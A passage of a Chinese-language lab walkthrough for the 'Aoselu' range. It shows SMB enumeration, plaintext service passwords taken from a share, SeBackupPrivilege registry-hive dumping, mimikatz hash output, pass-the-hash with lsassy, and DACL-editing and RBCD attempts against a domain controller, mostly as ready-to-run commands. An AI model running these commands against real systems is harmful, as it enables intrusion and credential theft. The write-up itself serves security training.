class="number">445</span>    ASLSRVFS02       C<span class="variable">$</span>                              Default share</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       FileService     READ,<span class="built_in">WRITE</span>      Aoselu FileService</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       IPC<span class="variable">$</span>            READ            Remote IPC</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>域用户<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;EthanMorris&lt;/font&gt;</code>只对<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;ASLSRVFS02$&lt;/font&gt;</code>主机上的共享文件夹<code>&lt;font style=&quot;color:rgb(155, 110, 35);background-color:rgb(255, 245, 227);&quot;&gt;FileService&lt;/font&gt;</code>有读写权限。</p>
<p>smb进一步信息收集</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbclient.py aoseluauto.com/EthanMorris:DROCV4?LtyCp@<span class="number">172.16</span>.<span class="number">34.23</span></span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN<span class="variable">$</span></span><br><span class="line">C<span class="variable">$</span></span><br><span class="line">FileService</span><br><span class="line">IPC<span class="variable">$</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>前面我们得知是处于172.16.34.23的用户都是在ITgroup里的，直接看IT</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/38.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/39.png"></p>
<p>找到几个账密，主要是要用svc_bakadm01</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --- credentials ---</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;aoseluauto\svc_bakadm01&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;k3!8Fa&amp;Sq8Z6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$backupUser</span> = <span class="string">&quot;aoseluauto\\svc_bakadm02&quot;</span></span><br><span class="line"><span class="variable">$backupPassPlain</span> = <span class="string">&quot;CYNpR5i@Z?_=&quot;</span></span><br></pre></td></tr></table></figure>





<p>那么我们rdp</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/40.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/41.png"></p>
<p>很奇怪，直接rdp上去，权限是不够的</p>
<p>使用evil-winrm打一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q evil-winrm -i 172.16.34.23 -u svc_bakadm01 -p &#x27;k3!8Fa&amp;Sq8Z6&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\svc_bakadm01\Documents&gt; whoami /priv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PRIVILEGES INFORMATION</span></span><br><span class="line"><span class="string">----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Privilege Name                Description                    State</span></span><br><span class="line"><span class="string">============================= ============================== =======</span></span><br><span class="line"><span class="string">SeBackupPrivilege             Back up files and directories  Enabled</span></span><br><span class="line"><span class="string">SeRestorePrivilege            Restore files and directories  Enabled</span></span><br><span class="line"><span class="string">SeShutdownPrivilege           Shut down the system           Enabled</span></span><br><span class="line"><span class="string">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span></span><br><span class="line"><span class="string">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span><br></pre></td></tr></table></figure>



<h4 id="SeBackupPrivilege-注册表提权"><a href="#SeBackupPrivilege-注册表提权" class="headerlink" title="SeBackupPrivilege-注册表提权"></a>SeBackupPrivilege-注册表提权</h4><p>这里可以看到有SeBackupPrivilege</p>
<p>注册表获取</p>
<p><code>reg save HKLM\SYSTEM sys.hiv</code></p>
<p><code>reg save HKLM\SAM sam.hiv</code></p>
<p><code>lsadump::sam /SAM:sam.hiv /SYSTEM:sys.hiv</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_bakadm01\Documents&gt; reg save HKLM\SYSTEM sys.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc_bakadm01\Documents&gt; reg save HKLM\SAM sam.hiv</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/42.png"></p>
<p>rdp下载或者用工具下载下来</p>
<p>解密hash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::sam /SAM:sam.hiv /SYSTEM:sys.hiv</span></span><br><span class="line">Domain : ASLSRVFS02</span><br><span class="line">SysKey : <span class="number">833</span>ec52f6f12689eda8e8ed4d5374009</span><br><span class="line">Local SID : S<span class="literal">-1-5-21-3738990733-2195238930-2414615058</span></span><br><span class="line"></span><br><span class="line">SAMKey : <span class="number">4</span>d4878654b95321d05917e2ee1249147</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line">    lm  - <span class="number">0</span>: e7bad95587f6ad969d96d05667fe8c19</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line">    ntlm- <span class="number">1</span>: <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : b39fea8560c0eefaa1f07243f16fd7ea</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : ASLSRVFS02.AOSELUAUTO.COMAdministrator</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">188</span>fe60f47efe9693471b3684966d4039c413ecc88a4aee6f47c71b2c1674f35</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">12</span>a677d89007b4add587b4bccf1d5f64</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">68</span>ea7f625d8f191c</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">3</span>f62f69b60fce562d1bf07bc11550eb05636382c39d6121142f2493aa191a411</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b4dfb71180ba6d0f86f6145dcd98df2e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">5</span>bd37a57b3790483</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASLSRVFS02.AOSELUAUTO.COMAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">68</span>ea7f625d8f191c</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">5</span>bd37a57b3790483</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: <span class="number">3</span>d23ddf5c2e625618408ee0ce3b888cb</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">67</span>e9590d1dacf510060b878de44923ed</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : ef3800dc9b13f309ed0aae0bd11f788f9c2ec01f39ecda41b53cff136f329683</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">89288</span>ad0ec267eb06faff6671686209a</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">198</span>c08e97c94e38f</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">198</span>c08e97c94e38f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><p>获取到02管理员的hash为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab</span><br></pre></td></tr></table></figure>





<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/43.png"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/44.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span>  已拿下  反序列化打内存马 cve<span class="literal">-2025-32463</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span>   已拿下  mysql udf potato  winauto自动登录账密</span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span>  已拿下  winauto账密泄露 注册表转存 抓取hash提权</span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span>  DC</span><br></pre></td></tr></table></figure>



<p>接下来就重新抓取一下hash，然后利用writedacl拿下域控了</p>
<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>利用writedacl的方法有很多，这里我的初想法还是Dcsync（想偷懒）</p>
<p>可以直接利用nxc转存hash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> nxc smb <span class="number">172.16</span>.<span class="number">34.23</span> <span class="literal">-u</span> Administrator <span class="literal">-H</span> <span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab <span class="literal">--local-auth</span> <span class="literal">-M</span> lsassy</span><br></pre></td></tr></table></figure>



<p>还是得rdp上去，不然抓取不到，应该是开了wd的原因</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/45.png"></p>
<p>果然</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/46.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Hundredsu)-[~]</span><br><span class="line">└─<span class="comment"># proxychains4 -q nxc smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -M lsassy</span></span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [*] Windows <span class="number">10</span> / Server <span class="number">2019</span> Build <span class="number">17763</span> x64 (name:ASLSRVFS02) (domain:ASLSRVFS02) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       [+] ASLSRVFS02\Administrator:<span class="number">74</span>aaf464e1a7a75f2123ada1dd62edab (Pwn3d!)</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       ASLSRVFS02\Hundredsu <span class="number">72</span>d98c440b25ce7b05d81233044c020c</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       AOSELUAUTO\svc_bakadm01 <span class="number">95</span>f063de7e971e16bcc9d0e8fdd6e857</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       AOSELUAUTO\svc_monadm01 ab232c3cf9f4b7cf27602082b04f306b</span><br><span class="line">LSASSY      <span class="number">172.16</span>.<span class="number">34.23</span>    <span class="number">445</span>    ASLSRVFS02       aoseluauto.com\svc_monadm01 <span class="number">96</span>Mr!je39y_p</span><br></pre></td></tr></table></figure>



<p>那么现在继续</p>
<h4 id="wirteDACL-DCSync-没成功"><a href="#wirteDACL-DCSync-没成功" class="headerlink" title="wirteDACL+DCSync(没成功)"></a>wirteDACL+DCSync(没成功)</h4><p>添加DCSync权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python dacledit.py aoseluauto.com/svc_monadm01 <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> DCSync <span class="literal">-principal</span> svc_monadm01 <span class="literal">-target-dn</span> <span class="string">&quot;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&quot;</span>  <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] DACL backed up to dacledit-20250710-192030.bak</span></span><br><span class="line"><span class="string">[*] DACL modified successfully!</span></span><br></pre></td></tr></table></figure>





<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py aoseluauto.com/svc_monadm01@<span class="number">172.16</span>.<span class="number">34.5</span> <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-just-dc-ntlm</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/47.png"></p>
<p>没成功</p>
<h4 id="writeDACL-RBCD"><a href="#writeDACL-RBCD" class="headerlink" title="writeDACL+RBCD"></a>writeDACL+RBCD</h4><p>还是老老实实吧</p>
<p>添加恶意主机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py <span class="literal">-computer-name</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-computer-pass</span> <span class="string">&#x27;123@#ABC&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>





<p>利用 WriteDacl修改目标的 DACL，添加指定用户对该主机的完全控制权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="literal">-rights</span> <span class="string">&#x27;FullControl&#x27;</span> <span class="literal">-principal</span> <span class="string">&#x27;svc_monadm01&#x27;</span> <span class="literal">-target-dn</span> <span class="string">&#x27;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>



<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/48.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py aoseluauto.com/svc_monadm01 <span class="literal">-hashes</span> <span class="string">&quot;00000000000000000000000000000000:ab232c3cf9f4b7cf27602082b04f306b&quot;</span> <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> FullControl <span class="literal">-principal</span> svc_monadm01 <span class="literal">-target-dn</span> <span class="string">&quot;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&quot;</span>  <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/49.png"></p>
<p>在cmd输入一直出错，搞了好久</p>
<p>转powershell才行，应该是编码的问题</p>
<p>打rbcd,添加权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(base) <span class="built_in">PS</span> D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt; python rbcd.py <span class="literal">-delegate-from</span> <span class="string">&#x27;test$&#x27;</span> <span class="literal">-delegate-to</span> <span class="string">&#x27;ASLSRVAD05$&#x27;</span> <span class="literal">-action</span> <span class="string">&#x27;write&#x27;</span> <span class="string">&#x27;aoseluauto.com/svc_monadm01&#x27;</span> <span class="literal">-hashes</span> :ab232c3cf9f4b7cf27602082b04f306b <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line">D:\Anaconda\Anaconda3\Lib\site<span class="literal">-packages</span>\requests\__init__.py:<span class="number">109</span>: RequestsDependencyWarning: urllib3 (<span class="number">2.3</span>.<span class="number">0</span>) or chardet (<span class="number">5.0</span>.<span class="number">0</span>)/charset_normalizer (<span class="number">2.0</span>.<span class="number">4</span>) doesn<span class="string">&#x27;t match a supported version!</span></span><br><span class="line"><span class="string">  warnings.warn(</span></span><br><span class="line"><span class="string">Impacket v0.9.23 - Copyright Fortra, LLC and its affiliated companies</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span></span><br><span class="line"><span class="string">[*] Delegation rights modified successfully!</span></span><br><span class="line"><span class="string">[*] test$ can now impersonate users on ASLSRVAD05$ via S4U2Proxy</span></span><br><span class="line"><span class="string">[*] Accounts allowed to act on behalf of other identity:</span></span><br><span class="line"><span class="string">[*]     test$        (S-1-5-21-198605783-2356506617-271110585-1247)</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/50.png"></p>
<p>获取票据（没成功）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python getST.py <span class="literal">-spn</span> cifs/ASLSRVAD05.aoseluauto.com aoseluauto/test\<span class="variable">$</span>:<span class="string">&#x27;123@#ABC&#x27;</span> <span class="literal">-impersonate</span> SVC_ADM01 <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket<span class="literal">-getST</span> <span class="literal">-spn</span> cifs/ASLSRVAD05.aoseluauto.com aoseluauto/COMPUTER\<span class="variable">$</span>:<span class="string">&#x27;123@#ABC&#x27;</span> <span class="literal">-impersonate</span> SVC_ADM01 <span class="literal">-dc-ip</span> <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>





<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">kali</span>/<span class="type">red</span>/<span class="type">impacket</span>-<span class="number">0.11</span><span class="type">.0</span>/<span class="type">examples</span>]</span><br><span class="line">└─<span class="comment"># proxychains4 impacket-getST -spn cifs/ASLSRVAD05.aoseluauto.com aoseluauto/COMPUTER\$:&#x27;123@#ABC&#x27; -impersonate SVC_ADM01 -dc-ip 172.16.34.5                                                                   </span></span><br><span class="line">[<span class="type">proxychains</span>] config file found: /etc/proxychains4.conf</span><br><span class="line">[<span class="type">proxychains</span>] preloading /usr/lib/x86_64<span class="literal">-linux-gnu</span>/libproxychains.so.<span class="number">4</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">[<span class="type">proxychains</span>] DLL init: proxychains<span class="literal">-ng</span> <span class="number">4.15</span></span><br><span class="line">Impacket v0.<span class="number">11.0</span> - Copyright <span class="number">2023</span> Fortra</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">[<span class="type">proxychains</span>] Strict chain  ...  <span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1123</span>  ...  <span class="number">172.16</span>.<span class="number">34.5</span>:<span class="number">88</span>  ...  OK</span><br><span class="line">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>显示Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</p>
<p>需要向域控同步时间才能解决，但是我的kali一直无法同步</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntpdate <span class="number">172.16</span>.<span class="number">34.5</span></span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>





<p>最后我选择换个方法请求票据，这里我重新弄了个恶意用户，害怕前面配错了 导致出问题</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/51.png"></p>
